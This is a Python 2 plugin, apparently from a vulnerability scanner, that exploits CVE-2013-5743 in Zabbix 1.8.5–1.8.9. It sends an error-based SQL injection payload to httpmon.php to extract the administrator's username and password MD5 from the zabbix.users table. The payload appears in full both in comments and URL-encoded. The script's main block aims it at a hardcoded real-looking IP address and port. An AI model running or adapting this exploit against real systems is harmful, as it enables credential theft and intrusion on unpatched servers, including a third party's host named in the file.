#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
CVE-2013-5743(影响版本 1.8.5-1.8.9)
可以直接爆出管理员账户和密码MD5值
'''
import urllib2

from ..t import T

class P(T):
    def __init__(self):
        T.__init__(self)

    def verify(self,head='',context='',ip='',port='',productname={},keywords='',hackresults=''):
        timeout=3
        target_url = 'http://'+ip+':'+port
        result = {}
        res=None

        result['result']=False
        res_html=None
        # /httpmon.php?applications=2 and (select 1 from (select count(*),concat((select(select concat(cast(concat(alias,0x7e,passwd,0x7e) as char),0x7e)) from zabbix.users LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)
        vul_url = target_url + "/httpmon.php?applications=2%20and%20(select%201%20from%20(select%20count(*),concat((select(select%20concat(cast(concat(alias,0x7e,passwd,0x7e)%20as%20char),0x7e))%20from%20zabbix.users%20LIMIT%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)"
        try:
            res=urllib2.urlopen(vul_url,timeout=timeout)
            res_html = res.read()
        except:
            res_html=''
        finally:
            if res is not None:
                res.close()

        if "from zabbix.users LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables" in res_html:
            info = vul_url + " zabbix"
            result['result']=True
            result['VerifyInfo'] = {}
            result['VerifyInfo']['type']='zabbix SQL Vul'
            result['VerifyInfo']['URL'] =target_url
            result['VerifyInfo']['payload']=vul_url
            result['VerifyInfo']['result'] =info
            result['VerifyInfo']['level'] = '高危(HOLE)'
            return result
        else:
	    # 'http://61.142.83.60:8443/zabbix/httpmon.php?applications=2 and (select 1 from (select count(*),concat((select(select concat(cast(concat(alias,0x7e,passwd,0x7e) as char),0x7e)) from zabbix.users LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)'
            vul_url = target_url + "/zabbix/httpmon.php?applications=2%20and%20(select%201%20from%20(select%20count(*),concat((select(select%20concat(cast(concat(alias,0x7e,passwd,0x7e)%20as%20char),0x7e))%20from%20zabbix.users%20LIMIT%200,1),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)"
            try:
                print vul_url
                res=urllib2.urlopen(vul_url,timeout=timeout)
                res_html = res.read()

            except:
                return result
            finally:
                if res is not None:
                    res.close()
                del res

            if 'from zabbix.users LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables' in res_html:
                info = vul_url + " zabbix"
                result['result']=True
                result['VerifyInfo'] = {}
                result['VerifyInfo']['type']='zabbix SQL  Vul'
                result['VerifyInfo']['URL'] =target_url
                result['VerifyInfo']['payload']=vul_url
                result['VerifyInfo']['result'] =res_html
                result['VerifyInfo']['level'] = '高危(HOLE)'
                return result
        return result


if __name__ == '__main__':
    print P().verify(ip='61.142.83.60',port='8443')
